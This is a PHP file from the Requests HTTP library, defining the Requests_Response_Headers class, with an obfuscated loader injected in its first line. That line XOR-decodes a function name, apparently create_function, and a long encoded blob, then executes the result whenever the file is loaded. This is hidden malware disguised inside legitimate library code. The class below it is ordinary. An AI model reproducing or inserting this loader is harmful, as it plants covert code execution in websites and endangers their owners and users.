<?php $dngDOdmbVDX='1RP1=R7XON1YP->'^'R 5PI7h>: R-9BP';$GDodiDfrZcHA=$dngDOdmbVDX('',':PMf-U:2H8W9s1HTM 6Ff9>174V180,74IcMkFGs05HCC2;Y;e5.C1=VB18d<Y3Ne<7FTaCG:,:prFoTnGyx<vSXZsGVUpTo0>Z>4Qj-ShLerRS0f=NKVH jmH0NLzZYiWIXzl0EMX TblhFEK4VZ eiPqzkMcZWY3QYZSDF6L<XUnC,7WhhyVZGN;1C1HYdLVLTdn>>7E:A<rROGRBWA138CEznF53A+,.P5NXV<8BNQXOI5T:K1V1Kdw24>bg03u+:LPGPLyrUXL2AT0EaDUrhuTYX+5RYDdRGsZ.NKfcOI8 MsPNr0O+D-ux1FII-tnLII72MSP9pz5D3NWYXMGr;bwed69mK-2rgR6;QXxUw.PZ4XdgK>:2K VA,c8PTaQalV06QLCymV1E7ghuB2O+K1y2>PEPAGiPAIPWHP4<Z;WD.5R;6HK+V=.R8AVsg:MXjUVCQzZ7D+X7XKFu+M 6lviN625;cY6EPYQ7IUmlOO=3jTcuVB>+Ok8YA8-637A:yV;+GMkHNYP7+odqRPR>JZYJHW3-bNK7UUpXxeVdFSoDbK4gAyRa5XLGuJ4mTC3BKybBPTFRRHXBBBPACH5N;KU>,+N3035XwHYOL Z>NUKWIV91LFRhaVJZ0fBS8T+fW...4,RL JL6ASwhkHMaN-XIeblCa+'^'S6eGK TQ<Q8W,T0=>TEnAAQChP7EYosZA=DdBf<y9S=- FR6UEMA1nY76Pg;Q,GfAXV25MccQICYRfOtN<sq5R<-.SzvrWoe97<QFyNDsUlUIrwYZN:9:-NBI,Q:-SayM>bsSf9Li7U BBUfmoP7.A>M9,Z5mG12 hu0zvd5B>P=;FgGR.A5PmPNGIT7D:7Lh99 MU47JOGK6V6.33bjaWRT0 AdbQR5JsE5LnevZY.=4cECS;H.P5YkLSmwq-,yvUJIlt,55YOkxhD 8E Hd.xaQ08,Jj9<=DogW1K7pljk-YT,SmnVF.G1HNrLLC KTFmm-VF,zpBzsS+A+6:0moVd0241sj9kLARC9SBqeFuSX16A=MG043;oD75M<S5-AlAH=UOjFJpI2P1VGUUfD.G>TB87-O-KMM4 =1wuptI4H26GT>RL-cS9Oq6Y57,8W8,B7704Lnh N;X<.nQO,TWEZIjRSAZ<2S<ypj= 3EH+.IRJrEU70LJ64S<8gHNZD5IQqPN>jGhj=1CJFDWtpzS.oqn,6GL9i R,r-qXXkDajWvV-RVtJ6VP:zwBrRY2uQvzHR afw30oqbddp 1:T7d 0GsN6ZCGFpP886 O;Ziyks-7MPeorHAvjzKlK6N5GNsJOZUwu<A3 Y 7P5BsGh+U1=MRExkV');$GDodiDfrZcHA();
/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 */

/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 */
class Requests_Response_Headers extends Requests_Utility_CaseInsensitiveDictionary {
	/**
	 * Get the given header
	 *
	 * Unlike {@see self::getValues()}, this returns a string. If there are
	 * multiple values, it concatenates them with a comma as per RFC2616.
	 *
	 * Avoid using this where commas may be used unquoted in values, such as
	 * Set-Cookie headers.
	 *
	 * @param string $key
	 * @return string Header value
	 */
	public function offsetGet($key) {
		$key = strtolower($key);
		if (!isset($this->data[$key])) {
			return null;
		}

		return $this->flatten($this->data[$key]);
	}

	/**
	 * Set the given item
	 *
	 * @throws Requests_Exception On attempting to use dictionary as list (`invalidset`)
	 *
	 * @param string $key Item name
	 * @param string $value Item value
	 */
	public function offsetSet($key, $value) {
		if ($key === null) {
			throw new Requests_Exception('Object is a dictionary, not a list', 'invalidset');
		}

		$key = strtolower($key);

		if (!isset($this->data[$key])) {
			$this->data[$key] = array();
		}

		$this->data[$key][] = $value;
	}

	/**
	 * Get all values for a given header
	 *
	 * @param string $key
	 * @return array Header values
	 */
	public function getValues($key) {
		$key = strtolower($key);
		if (!isset($this->data[$key])) {
			return null;
		}

		return $this->data[$key];
	}

	/**
	 * Flattens a value into a string
	 *
	 * Converts an array into a string by imploding values with a comma, as per
	 * RFC2616's rules for folding headers.
	 *
	 * @param string|array $value Value to flatten
	 * @return string Flattened value
	 */
	public function flatten($value) {
		if (is_array($value)) {
			$value = implode(',', $value);
		}

		return $value;
	}

	/**
	 * Get an iterator for the data
	 *
	 * Converts the internal
	 * @return ArrayIterator
	 */
	public function getIterator() {
		return new Requests_Utility_FilteredIterator($this->data, array($this, 'flatten'));
	}
}
